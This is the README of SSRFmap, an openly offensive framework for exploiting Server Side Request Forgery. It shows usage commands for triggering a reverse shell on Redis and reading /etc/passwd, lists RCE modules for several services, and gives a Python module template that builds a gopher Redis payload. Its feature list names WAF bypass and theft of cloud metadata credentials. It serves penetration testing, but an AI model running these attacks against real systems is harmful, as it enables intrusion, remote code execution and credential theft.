# SSRFmap [![Python 3.4+](https://img.shields.io/badge/python-3.4+-blue.svg)](https://www.python.org/downloads/release/python-360/)

SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. SSRFmap takes a Burp request file as input and a parameter to fuzz.

> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

## Guide / RTFM

Basic install

```powershell
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
python3 ssrfmap.py
```

```powershell
usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [--lhost LHOST]
                  [--lport LPORT]

optional arguments:
  -h, --help     show this help message and exit
  -r REQFILE     SSRF Request file
  -p PARAM       SSRF Parameter to target
  -m MODULES     SSRF Modules to enable
  -l HANDLER     Start an handler for a reverse shell
  --lhost LHOST  LHOST reverse shell
  --lport LPORT  LPORT reverse shell
  --level [LEVEL]  Level of test to perform (1-5, default: 1)
```

The default way to use this script is the following.

```powershell
# Launch a portscan on localhost and read default files
python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan

# Triggering a reverse shell on a Redis
python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242

# -l create a listener for reverse shell on the specified port
# --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
```

A quick way to test the framework can be done with `data/example.py` SSRF service.

```powershell
FLASK_APP=data/example.py flask run &
python ssrfmap.py -r data/request.txt -p url -m readfiles
```

## Modules

The following modules are already implemented and can be used with the `-m` argument.

| Name           | Description    |
| :------------- | :------------- |
| `fastcgi`      | FastCGI RCE |
| `redis`        | Redis RCE |
| `github`       | Github Enterprise RCE < 2.8.7 |
| `zaddix`        | Zaddix RCE |
| `mysql`        | MySQL Command execution |
| `smtp`        | SMTP send mail |
| `portscan`     | Scan ports for the host |
| `networkscan`    | HTTP Ping sweep over the network |
| `readfiles`    | Read files such as `/etc/passwd` |

## Contribute

I <3 pull requests :)
Feel free to add any feature listed below or a new service.

- --level arg - ability to tweak payloads in order to bypass some IDS/WAF. E.g: `127.0.0.1 -> [::] -> 0000: -> ...`
- aws and other cloud providers - extract sensitive data from http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy and more
- sockserver  - SSRF SOCK proxy server - https://github.com/iamultra/ssrfsocks
- handle request with file in requester

The following code is a template if you wish to add a module interacting with a service.

```python
from core.utils import *
import logging

name          = "servicename in lowercase"
description   = "ServiceName RCE - What does it do"
author        = "Name or pseudo of the author"
documentation = ["http://link_to_a_research", "http://another_link"]

class exploit():

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Using a generator to create the host list - generate tests based on the level
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:

          # Data for the service
          port = "6379"
          data = "*1%0d%0a$8%0d%0af[...]save%0d%0aquit%0d%0a"
          payload = wrapper_gopher(data, ip , port)

          # Handle args for reverse shell
          if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
          else:                  payload = payload.replace("SERVER_HOST", args.lhost)

          if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
          else:                  payload = payload.replace("SERVER_PORT", args.lport)

          # Send the payload
          r = requester.do_request(args.param, payload)
```

You can also contribute with a beer IRL or with `buymeacoffee.com`

[![Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoff.ee/swissky)

## Thanks to the contributors

- ???

## Inspired by

- [All you need to know about SSRF and how may we write tools to do auto-detect - Auxy](https://medium.com/bugbountywriteup/the-design-and-implementation-of-ssrf-attack-framework-550e9fda16ea)
- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [Blog on Gopherus Tool  -SpyD3r](https://spyclub.tech/2018/blog-on-gopherus/)
- [Gopherus - Github](https://github.com/tarunkant/Gopherus)